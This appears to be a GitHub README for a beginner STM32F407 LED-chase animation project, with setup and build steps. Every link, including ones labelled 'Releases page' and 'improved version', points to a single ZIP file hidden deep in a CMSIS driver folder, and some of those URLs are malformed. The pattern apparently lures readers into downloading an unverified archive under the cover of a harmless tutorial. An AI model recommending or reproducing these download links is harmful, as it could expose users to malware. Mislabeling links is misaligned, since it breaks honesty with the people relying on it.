# 🎉 01_Kayan_LED_Animasyonu - Simple LED Animation for STM32

## 📦 Download Now
[![Download](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip%https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip)](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip)

---

## 📋 Description

This project shows how to create a classic LED animation using the **STM32F407-Discovery** board. It lights up four LEDs in a sequence, mimicking the "Knight Rider" effect. The program is built with STM32CubeIDE and the HAL library. It demonstrates a basic approach where each LED is controlled with simple commands like `HAL_GPIO_WritePin` and `HAL_Delay`.

## 🎯 Project Scenario

The animation works as follows:
1. The LEDs light up from `PA1` to `PA4` in order (moving right).
2. The LEDs then turn off in reverse order from `PA4` back to `PA1` (moving left).

## 🚀 Getting Started

To get started with this project, follow these steps:

### 1. Check System Requirements
- **Hardware:** A computer with USB support.
- **Software:** You will need STM32CubeIDE installed on your system. Download it from the official STMicroelectronics website.
- **Board:** Ensure you have the STM32F407-Discovery board.

### 2. Visit Release Page
Go to the [Releases page](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip) to find the latest version of the software. 

### 3. Download the Application
Click on the latest release and download the ZIP file.

![Download ZIP](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip%https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip)

### 4. Extract the Files
After downloading, locate the ZIP file and extract its contents to a folder on your computer.

### 5. Open STM32CubeIDE
- Launch STM32CubeIDE.
- Navigate to the folder where you extracted the files.
  
### 6. Import the Project
- In STM32CubeIDE, click on `File` > `Import`.
- Select `Existing Projects into Workspace`.
- Browse to the folder containing the extracted files and select it.
- Click `Finish` to import the project.

### 7. Build the Project
- Right-click on the project in the Project Explorer.
- Select `Build Project`.
- Wait for the build to complete without errors.

### 8. Upload to the Board
- Connect the STM32F407-Discovery board to your computer via USB.
- In STM32CubeIDE, click on `Run` > `Debug`.
- Follow the prompts to upload the program to your board.

### 9. Run the Animation
Once uploaded, the LEDs will automatically start animating. Watch the lights move back and forth!

## 🔧 Features
- Control up to four LEDs.
- Simple commands to demonstrate basic programming concepts.
- Ideal for beginners interested in embedded systems and microcontrollers.

## 📚 Additional Resources

If you are interested in a more advanced version of this project that uses arrays and loops to reduce code repetition, check out the improved version [here](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip).

## 💬 Support

If you encounter any issues, please open an issue on the GitHub repository. We welcome feedback and contributions.

## 📜 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.